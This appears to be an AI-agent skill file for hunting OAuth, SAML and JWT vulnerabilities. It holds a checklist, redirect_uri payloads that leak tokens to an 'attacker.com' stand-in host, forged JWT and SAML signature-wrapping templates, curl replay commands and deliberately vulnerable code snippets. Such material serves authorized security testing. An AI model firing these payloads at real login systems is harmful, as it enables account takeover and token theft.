---
name: hunt-oauth
description: OAuth/SAML hunting — Token theft, redirect URI manipulation, SSO bypass. Use when testing for OAuth vulnerabilities, when user mentions authentication bypass, or when analyzing SSO flows. Includes JWT attacks and session hijacking.
---

# 🎯 OAuth/SAML Hunting Skill

Elite-level OAuth/SAML vulnerability detection and exploitation.

## Detection Checklist

### OAuth
- [ ] Test redirect_uri manipulation
- [ ] Test state parameter bypass
- [ ] Test PKCE bypass
- [ ] Test token leakage
- [ ] Test scope escalation

### SAML
- [ ] Test XML signature wrapping
- [ ] Test assertion manipulation
- [ ] Test audience restriction bypass
- [ ] Test nameID format abuse

### JWT
- [ ] Test algorithm confusion (none, HS256→RS256)
- [ ] Test claim manipulation
- [ ] Test key injection
- [ ] Test token expiration bypass

## Payloads

### OAuth Redirect URI
```
# Open redirect
https://target.com/callback?redirect_uri=https://attacker.com

# Subdomain bypass
https://target.com/callback?redirect_uri=https://evil.target.com

# Parameter pollution
https://target.com/callback?redirect_uri=https://legit.com&redirect_uri=https://attacker.com

# URL parsing tricks
https://target.com/callback?redirect_uri=https://attacker.com@target.com
https://target.com/callback?redirect_uri=https://target.com#@attacker.com
```

### JWT Attacks
```json
// Algorithm none
{
  "alg": "none",
  "typ": "JWT"
}

// Algorithm confusion
{
  "alg": "HS256",
  "typ": "JWT"
}

// Claim manipulation
{
  "sub": "admin",
  "role": "admin",
  "exp": 9999999999
}
```

### SAML Attacks
```xml
<!-- Signature wrapping -->
<saml:Assertion>
  <saml:Subject>
    <saml:NameID>admin@target.com</saml:NameID>
  </saml:Subject>
  <ds:Signature>
    <ds:SignedInfo>
      <ds:CanonicalizationMethod Algorithm="..."/>
      <ds:SignatureMethod Algorithm="..."/>
      <ds:Reference URI="#signed">
        <ds:DigestValue>...</ds:DigestValue>
      </ds:Reference>
    </ds:SignedInfo>
    <ds:SignatureValue>...</ds:SignatureValue>
  </ds:Signature>
  <saml:Assertion id="signed">
    <saml:Subject>
      <saml:NameID>user@target.com</saml:NameID>
    </saml:Subject>
  </saml:Assertion>
</saml:Assertion>
```

## Testing Methodology

1. **Map OAuth flow** — authorization endpoint, token endpoint, redirect URI
2. **Test state parameter** — is it validated? Can it be bypassed?
3. **Test redirect URI** — can it be manipulated to leak tokens?
4. **Test PKCE** — is code_verifier validated?
5. **Test token storage** — is it exposed in URL, localStorage, cookies?
6. **Test JWT** — algorithm, claims, expiration, key management

## Tools
- `jwt_tool` — JWT manipulation
- `Burp Suite` — OAuth flow interception
- `SAMLRaider` — SAML testing
- `OAuth2 Proxy` — OAuth testing

## Common Vulnerable Patterns
```javascript
// Missing state validation
if (code) {
  const token = await exchangeCode(code);  // No state validation
}

// Open redirect
if (redirect_uri.startsWith('/')) {
  res.redirect(redirect_uri);  // Path traversal possible
}

// Weak JWT verification
const decoded = jwt.verify(token, 'secret');  // Weak secret
const decoded = jwt.decode(token);  // No verification
```

## Impact Escalation
```bash
# Token theft via open redirect
https://target.com/auth?redirect_uri=https://attacker.com/steal

# Account takeover via JWT
curl -H "Authorization: Bearer <manipulated_jwt>" https://target.com/api/admin

# Session hijacking via SAML
curl -d @forged_saml.xml https://target.com/sso/callback
```
